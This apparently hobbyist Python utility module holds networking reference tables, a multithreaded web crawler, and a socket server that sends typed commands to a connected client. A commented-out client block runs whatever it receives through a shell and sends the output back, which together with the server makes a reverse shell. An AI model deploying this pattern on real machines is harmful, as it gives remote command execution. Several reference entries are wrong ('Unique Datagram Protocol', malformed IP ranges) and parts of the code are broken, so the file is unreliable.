#! /usr/bin/env python3		#Allow Unix shell to execute as a Python script
# _*_ coding: UTF-8 _*_		#Enable unicode encoding
#GMT+0BST-1,M3.5.0/01:00:00,M10.5.0/02:00:00

__author__ = "Ian Pottinger"
__date__ = "20/12/2012"
__contact__ = "ianpottinger@me.com"
__version__ = "1.3.5.7.9 even avoidance"
__credits__ = "Commonly known as Potts"
__copyright__ = "Copyleft for balance"
__license__ = "Whatever Potts Decides"
__metadata__ = [__author__, __date__, __contact__, __version__,
                __credits__, __copyright__, __license__]


import multiprocessing
import concurrent
import threading
import asyncio
import html
import keyword
import pdb
import queue
import socket
import sys
import threading
import unittest
import urllib

DEBUG_MODE = True
if DEBUG_MODE:
    import pdb
    #pdb.set_trace()
    import logging
    FORMAT = '%(asctime)s - %(levelname)s - %(funcName)s - %(message)s'
    logging.basicConfig(level = logging.INFO, format = FORMAT)
    #logging.basicConfig(level = logging.WARNING, format = FORMAT)
    #logging.basicConfig(level = logging.DEBUG, format = FORMAT)
    #logging.basicConfig(level = logging.ERROR, format = FORMAT)
    #logging.basicConfig(level = logging.CRITICAL, format = FORMAT)

RESERVED = ['False', 'None', 'True', 'and', 'as', 'assert', 'break',
            'class', 'continue', 'def', 'del', 'elif', 'else', 'except', 'exec',
            'finally', 'for', 'from', 'global', 'if', 'import', 'in', 'is',
            'lambda', 'nonlocal', 'not', 'or', 'pass', 'print',
            'raise', 'return', 'try', 'while', 'with', 'yield']
KEYWORDS = keyword.kwlist

#Please Do Not Throw Sausgage Pizza Away
#Because
#All People Seem To Need Data Processing
OSI_Layers = {0: ("OSI", "TCP", {"Protocol Data Units"},
                  {"Protocol"}, {"Description"},
                  "Encupsulation", {"", "", ""}),
              1: ("Physical", "Media", {"Bits"},
                  {"Ethernet", "Wireless", "Token Ring", "FDDI"},
                  {"IEEE 802.3", "IEEE 802.11", "IEEE 802.5", ""},
                  "Signalling", {"", "", ""}),
              2: ("Link", "Media", {"Frames"},
                  {"MAC", "ARP", "PPP", "LLC"},
                  {"Media Access Control CSMA/CD/CA",
                   "Address Resolution Protocol",
                   "Point2Point Protocol",
                   "Logical Link Control"},
                  "Switching", {"Framing bits", "Packet payload", "Frame check sequence"}),
              3: ("Network", "Internet", {"Packets"},
                  {"IP", "ICMP", "IGMP"},
                  {"Internet Protocol",
                   "Internet Control Message Protocol",
                   "Internet Group Management Protocol"},
                  "Routing", {"IP Addressing", "Sequence", "Error detection"}),
              4: ("Transport", "Host", {"Segments", "Datagrams"},
                  {"TCP", "UDP"},
                  {"Transmission Control Protocol",
                   "Unique Datagram Protocol"},
                  "Flow Control", {"Header", "Circuits", "Error recovery"}),
              5: ("Session", "Application", {"Data"},
                  {"RPC", "NetBIOS", "NBT", "SQL"},
                  {"Remote Procdure Call",
                   "Network Basic Input/Output System",
                   "NetBIOS over TCP",
                   "Structured Query Language"},
                  "Channel", {"Connection", "Exchange", "Synchronise"}),
              6: ("Presentation", "Application", {"Data"},
                  {"MIME", "SSL", "TLS"},
                  {"Multipurpose Internet Mail Extensions",
                   "Secure Socket Layer",
                   "Transport Layer Security"},
                  "Format", {"Conversion", "", ""}),
              7: ("Application", "Application", {"Data"},
                  {"DNS", "DHCP", "HTTP", "POP3", "IMAP", "SMTP", "SIP", "SNMP", "FTP", "SMB", "SSH", "RDP"},
                  {"Domain Name Service",
                   "Dynamic Host Configuration Protocol",
                   "Hypertext Transfer Protocol",
                   "Post Office Protocol v3",
                   "Internet Message Access Protocol",
                   "Simple Mail Transport Protocol",
                   "Session Initiation Protocol",
                   "Simple Network Management Protocol",
                   "File Transfer Protocol",
                   "Server Message Block",
                   "Secure Shell",
                   "Remote Desktop Protocol"},
                  "Protocol", {"Services", "Translation", ""})}

IP_Classes = {"A": [0, 127, 1, "10.0.0.0", "10.255.255.255.255", "10.0.0.0/8", 16777215],
              "B": [128, 191, 2, "172.16.0.0", "172.31.255.255", "172.16.0.0/12", 1048575],
              "C": [192, 223, 3, "192.168.0.0", "192.168.255.255", "192.168.0.0/16", 65535],
              "D": [224, 239, 4, "224.0.0.", "224.0.1.255", "224.0.0.0/20", 4095],
              "E": [240, 247, 5, "240.0.0.0", "240.0.0.255", "240.0.0.0/24", 255],
              "F": [248, 251, 6, "248.0.0.0", "248.0.0.15", "248.0.0.0/28", 15],
              "G": [252, 253, 7, "252.0.0.0", "252.0.0.1", "252.0.0.0/32", 1]}

HTTP_Status = {1: "Information",
               2: "Successful",
               3: "Redirection",
               4: "Client Error",
               5: "Server Error"}

import moreadt, fileman
from html.parser import HTMLParser


def update_python():
    import pip
    installed_packages = pip.get_installed_distributions()
    installed_packages_list = sorted(["%s==%s" % (i.key, i.version)
                                      for i in installed_packages])
    for pack in installed_packages_list:
        print(pack)


def single_thread(function, arguments):
    return map(function, arguments)


def multi_thread(function, arguments):
    return concurrent.futures.ProcessPoolExecutor.map(function, arguments)


def intensive(number):
    return number ** 1000


def fully_qualified(object):
    return object.__qualname__


def create_socket():
    try:
        global host
        global port
        global server
        host = ''
        port = 9999
        server = socket.socket()
    except socket.error as msg:
        print("Socket creation error: " + str(msg))


def bind_socket():
    try:
        global host
        global port
        global server
        print("Binding socket to port: " + str(port))
        server.bind((host, port))
        server.listen(5)
    except socket.error as msg:
        print("Socket binding error: " + str(msg) + "\n" + "Retrying...")
        socket_bind()


def accept_socket():
    conn, address = server.accept()
    # print("" + "" + "" + )
    send_commands(conn)
    conn.close()


def send_commands(conn):
    while True:
        cmd = input()
        if cmd == "quit":
            conn.close()
            server.close()
            sys.exit()
        if len(str.encode(cmd)) > 0:
            conn.send(str.encode(cmd))
            client_response = str(conn.recv(1024), "utf-8")
            print(client_response, end="")


def get_domain_name(url):
    try:
        domain = get_sub_domain_name(url).split('.')
        return domain[-2] + '.' + domain[-1]
    except:
        return ''


def get_sub_domain_name(url):
    try:
        return urllib.parse.urlparse(url).netloc
    except:
        return ''


class LinkFinder(HTMLParser):
    def __init__(self, base_url, page_url):
        super().__init__()
        self.base_url = base_url
        self.page_url = page_url
        self.links = set()

    def handle_starttag(self, tag, attrs):
        if tag == 'a':
            for (attribute, value) in attrs:
                if attribute == 'href':
                    url = urllib.parse.urljoin(self.base_url, value)
                    self.links.add(url)

    def page_links(self):
        return self.links

    def error(self, message):
        pass


class Crawler:
    target_name = ''
    base_url = ''
    domain_name = ''
    queue_file = ''
    crawled_file = ''
    queue = set()
    crawled = set()

    def __init__(self, target_name, base_url, domain_name):
        Crawler.target_name = target_name
        Crawler.base_url = base_url
        Crawler.domain_name = domain_name
        Crawler.queue_file = Crawler.target_name + '/queue.txt'
        Crawler.crawled_file = Crawler.target_name + '/crawled.txt'
        self.hatch()
        self.crawl_page('Root crawler', Crawler.base_url)

    @staticmethod
    def hatch():
        fileman.create_directory(Crawler.target_name)
        fileman.create_file(Crawler.queue_file)
        fileman.create_file(Crawler.crawled_file)
        fileman.write_file(Crawler.queue_file, Crawler.base_url)
        fileman.write_file(Crawler.crawled_file, Crawler.base_url)
        Crawler.queue = fileman.file_to_set(Crawler.queue_file)
        Crawler.crawled = fileman.file_to_set(Crawler.crawled_file)

    @staticmethod
    def crawl_page(thread_name, page_url):
        if page_url not in Crawler.crawled:
            print(thread_name + ' now crawling ' + page_url)
            print('Queue ' + str(len(Crawler.queue)) +
                  ' | crawled ' + str(len(Crawler.crawled)))
            Crawler.add_links_to_queue(Crawler.gather_links(page_url))
            Crawler.queue.remove(page_url)
            Crawler.crawled.add(page_url)
            Crawler.update_files()

    @staticmethod
    def gather_links(page_url):
        html_string = ''
        try:
            response = urllib.urlopen(page_url)
            if response.getheader('Content-Type') == 'text/html':
                html_bytes = response.read()
                html_string = html.byte.decode('utf-8')
            finder = LinkFinder(Crawler.base_url, page_url)
            finder.feed(html_string)
        except:
            print('Error: unable to process page')
            return set()
        return finder.page_links()

    @staticmethod
    def add_links_to_queue(links):
        for link in links:
            if link in Crawler.queue:
                continue
            if link in Crawler.crawled:
                continue
            if Crawler.domain_name not in link:
                continue
            Crawler.queue.add(link)

    @staticmethod
    def update_files():
        fileman.set_to_file(Crawler.queue_file, Crawler.queue)
        fileman.set_to_file(Crawler.crawled_file, Crawler.crawled)


def create_tasks(worker, task_queue):
    for link in fileman.file_to_set(worker.queue_file):
        task_queue.put(link)
    task_queue.join()
    return task_queue


def crawl_website(target, website, threads):
    def work():
        while True:
            url = task_queue.get()
            Crawler.crawl_page(threading.current_thread().name, url)
            task_queue.task_done()

    domain = get_domain_name(website)
    worker = Crawler(target, website, domain)
    task_queue = queue.Queue()
    queued_links = fileman.file_to_set(worker.queue_file)
    if len(queued_links) > 0:
        print(str(len(queued_links)) + ' links remaining in the queue')
        task_queue = create_tasks(worker, task_queue)

    for _ in range(threads):
        workers = threading.Thread(target=work)
        workers.daemon = True
        workers.start()


def main():
    create_socket()
    bind_socket()
    accept_socket()


# main()


# client = socket.socket()
# hostname = '192.168.0.12'
# tcpport = 9999
# client.connect((hostname, tcpport))

# while True:
#    data = client.recv(1024)
#    if len(data) > 0:
#        cmd = subprocess.Popen(data[:].decode("utf-8"), shell = True,
#                               stdout = subprocess.PIPE, stderr = subprocess.STD_ERROR_HANDLE)
#        output_bytes = cmd.stdout.read() + cmd.stderr.read()
#        output_str = str(output_bytes, "utf-8")
#        client.send(str.encode(output_str + str(os.getcwd()) + '> '))
#        print(output_str)












parameters = list(range(20))

# If this module is being run as a stand-alone program
import doctest

if __name__ == '__main__':
    doctest.testmod()
    unittest.main(exit=False)

    moreadt.count_entries(moreadt.fibonacci_tree(6))

##    cProfile.run('print(list(single_thread(intensive, parameters)))')
##    cProfile.run('print(list(multi_thread(intensive, parameters)))')
